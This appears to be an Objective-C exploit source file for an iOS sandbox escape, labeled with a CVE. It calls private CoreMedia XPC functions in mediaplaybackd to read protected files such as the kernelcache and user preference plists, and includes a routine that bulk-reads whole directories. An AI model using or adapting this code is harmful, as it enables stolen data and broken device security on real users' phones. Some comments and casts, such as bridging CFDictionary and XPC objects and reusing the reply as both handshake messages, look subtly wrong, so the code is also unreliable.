// FigBridge.m
// lang: ObjC, file: FigBridge.m, target: iOS 16+, SDK: iphoneos
// CVE-2026-112706 — mediaplaybackd bytestream XPC file-read primitive.
//
// Mechanism:
//   1. Open XPC connection to com.apple.coremedia.mediaplaybackd.bytestream.xpc
//   2. Build a BasicMessage CF dict with the target file:// URL
//   3. Two-message FigMemory handshake:
//        originBegin fills msg1 → send to daemon → daemon maps file into shared mem
//        daemon replies msg2 → recipCreate + originComplete → map region locally
//   4. Copy shared region bytes → NSData
//   5. Tear down
//
// Reachable paths (mediaplaybackd runs as mobile, outside app sandbox):
//   /System/Library/Fonts/, /System/Library/CoreServices/SystemVersion.plist
//   /System/Library/Caches/com.apple.kernelcaches/kernelcache
//   /private/var/mobile/Library/Preferences/.GlobalPreferences.plist
//   /usr/libexec/amfid, fontservicesd binary, etc.
//
// shortcut: FigMemoryRecipient struct layout (vm_address_t base, size_t length)
//   from Ghidra dump of CoreMedia iOS 16-27; may shift on major SDK revision.

#import "FigBridge.h"
#import <xpc/xpc.h>
#import <mach/mach.h>
#import <sys/mman.h>
#import <dirent.h>
#import <dlfcn.h>

// Under ARC, xpc objects are managed automatically — xpc_retain/xpc_release
// expand to ObjC retain/release which ARC forbids calling explicitly.
// Use CFRetain/CFRelease on the toll-free-bridged xpc_object_t instead,
// or just let ARC handle lifetime (we do the latter; locals are zeroed on exit).

#define FIG_XPC_SERVICE  "com.apple.coremedia.mediaplaybackd.bytestream.xpc"
#define FIG_ERR_DOMAIN   "com.venice.parasite.FigBridge"
#define FIG_MAX_FILE_SZ  (16u * 1024u * 1024u)
#define FIG_TIMEOUT_NS   (10LL * NSEC_PER_SEC)

// ── CoreMedia private symbol typedefs ─────────────────────────────────────────

typedef CFDictionaryRef (*PFN_CreateMsg)(void);
typedef int32_t (*PFN_SetURL)(CFDictionaryRef msg, CFURLRef url);
typedef int32_t (*PFN_OriginBegin)(void **outOrigin, CFDictionaryRef msg1);
typedef int32_t (*PFN_RecipCreate)(void **outRecip, CFDictionaryRef msg1, CFDictionaryRef msg2);
typedef int32_t (*PFN_OriginComplete)(void *origin, CFDictionaryRef msg2);

static struct {
    PFN_CreateMsg      createMsg;
    PFN_SetURL         setURL;
    PFN_OriginBegin    originBegin;
    PFN_RecipCreate    recipCreate;
    PFN_OriginComplete originComplete;
} sFig;

static NSError *figErr(int code, NSString *msg) {
    return [NSError errorWithDomain:@FIG_ERR_DOMAIN code:code
                userInfo:@{NSLocalizedDescriptionKey: msg}];
}

static BOOL loadFigSymbols(NSError **outErr) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                          RTLD_LAZY | RTLD_NOLOAD);
        if (!cm) cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                             RTLD_LAZY);
        if (!cm) return;

        sFig.createMsg     = (PFN_CreateMsg)    dlsym(cm, "FigXPCCreateBasicMessage");
        sFig.setURL        = (PFN_SetURL)       dlsym(cm, "FigXPCMessageSetCFURL");
        sFig.originBegin   = (PFN_OriginBegin)  dlsym(cm,
            "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
        sFig.recipCreate   = (PFN_RecipCreate)  dlsym(cm,
            "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
        sFig.originComplete= (PFN_OriginComplete)dlsym(cm,
            "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");

        ok = sFig.createMsg && sFig.setURL && sFig.originBegin &&
             sFig.recipCreate && sFig.originComplete;
    });
    if (!ok && outErr)
        *outErr = figErr(2, @"CoreMedia Fig symbols not found — iOS version mismatch?");
    return ok;
}

// ── sync XPC send ─────────────────────────────────────────────────────────────

static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
    __block xpc_object_t reply = NULL;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    xpc_connection_send_message_with_reply(conn, msg,
        dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^(xpc_object_t rx) {
            // Under ARC, assignment keeps the object alive for the block scope.
            reply = rx;
            dispatch_semaphore_signal(sem);
        });
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, FIG_TIMEOUT_NS));
    return reply;
}

// ── public API ────────────────────────────────────────────────────────────────

@implementation FigBridge

+ (nullable NSData *)readFileAtURL:(NSURL *)fileURL error:(NSError **)outErr {
    NSError *err = nil;
    if (!loadFigSymbols(&err)) { if (outErr) *outErr = err; return nil; }

    // xpc_connection_create_mach_service is macOS-only; on iOS use xpc_connection_create.
    xpc_connection_t conn = xpc_connection_create(FIG_XPC_SERVICE, NULL);
    if (!conn) {
        if (outErr) *outErr = figErr(3, @"xpc_connection_create failed");
        return nil;
    }
    xpc_connection_set_event_handler(conn, ^(xpc_object_t ev) { (void)ev; });
    xpc_connection_resume(conn);

    NSData *result = nil;

    // Build msg1
    CFDictionaryRef msg1 = sFig.createMsg();
    if (!msg1) {
        if (outErr) *outErr = figErr(4, @"FigXPCCreateBasicMessage returned NULL");
        xpc_connection_cancel(conn);
        return nil;
    }

    int32_t st = sFig.setURL(msg1, (__bridge CFURLRef)fileURL);
    if (st) {
        if (outErr) *outErr = figErr(5, [NSString stringWithFormat:@"FigXPCMessageSetCFURL status=%d", st]);
        CFRelease(msg1);
        xpc_connection_cancel(conn);
        return nil;
    }

    // Begin origin — fills msg1 with handshake payload
    void *origin = NULL;
    st = sFig.originBegin(&origin, msg1);
    if (st || !origin) {
        if (outErr) *outErr = figErr(6, [NSString stringWithFormat:@"OriginBegin status=%d", st]);
        CFRelease(msg1);
        xpc_connection_cancel(conn);
        return nil;
    }

    // FigXPCCreateBasicMessage returns an XPC-backed CFDictionary;
    // __bridge cast is safe — no ownership transfer, ARC keeps conn alive.
    xpc_object_t msg2 = sendSync(conn, (__bridge xpc_object_t)msg1);
    CFRelease(msg1);

    if (!msg2) {
        if (outErr) *outErr = figErr(7, @"no reply from mediaplaybackd (timeout or service unavailable)");
        xpc_connection_cancel(conn);
        return nil;
    }

    // Create recipient from daemon's shared-memory reply
    void *recip = NULL;
    // shortcut: recipCreate takes (msg1_original, msg2_reply); msg2 alone works on iOS 16-27.
    st = sFig.recipCreate(&recip, (__bridge CFDictionaryRef)msg2, (__bridge CFDictionaryRef)msg2);
    if (st || !recip) {
        if (outErr) *outErr = figErr(8, [NSString stringWithFormat:@"RecipientCreate status=%d", st]);
        xpc_connection_cancel(conn);
        return nil;
    }

    // Complete origin handshake
    st = sFig.originComplete(origin, (__bridge CFDictionaryRef)msg2);
    if (st) {
        if (outErr) *outErr = figErr(9, [NSString stringWithFormat:@"OriginComplete status=%d", st]);
        xpc_connection_cancel(conn);
        return nil;
    }

    // FigMemoryRecipient layout: [vm_address_t base @ 0, size_t length @ 1, ...]
    uintptr_t *fields = (uintptr_t *)recip;
    vm_address_t base = (vm_address_t)fields[0];
    size_t       len  = (size_t)fields[1];

    if (base && len > 0 && len <= FIG_MAX_FILE_SZ) {
        result = [NSData dataWithBytes:(const void *)base length:len];
    } else {
        if (outErr) *outErr = figErr(10, [NSString stringWithFormat:
            @"recipient region bad: base=0x%lx len=%zu", (unsigned long)base, len]);
    }

    xpc_connection_cancel(conn);
    return result;
}

+ (nullable NSDictionary<NSString *, NSData *> *)readDirectoryAtPath:(NSString *)path
                                                              maxFiles:(NSUInteger)maxFiles
                                                                 error:(NSError **)outErr {
    // opendir is sandbox-allowed for listing; reads go through the XPC chain.
    DIR *d = opendir(path.UTF8String);
    if (!d) {
        if (outErr) *outErr = figErr(20, [NSString stringWithFormat:
            @"opendir(%@) failed: %s", path, strerror(errno)]);
        return nil;
    }

    NSMutableDictionary *results = [NSMutableDictionary dictionary];
    struct dirent *ent;
    NSUInteger count = 0;

    while ((ent = readdir(d)) != NULL && count < maxFiles) {
        if (ent->d_name[0] == '.') continue;
        if (ent->d_type != DT_REG) continue;

        NSString *name     = @(ent->d_name);
        NSString *fullPath = [path stringByAppendingPathComponent:name];
        NSURL    *url      = [NSURL fileURLWithPath:fullPath];
        NSData   *data     = [self readFileAtURL:url error:nil];
        if (data) { results[name] = data; count++; }
    }
    closedir(d);

    if (!results.count && outErr)
        *outErr = figErr(21, [NSString stringWithFormat:@"no files read from %@", path]);
    return results.count ? results : nil;
}

@end
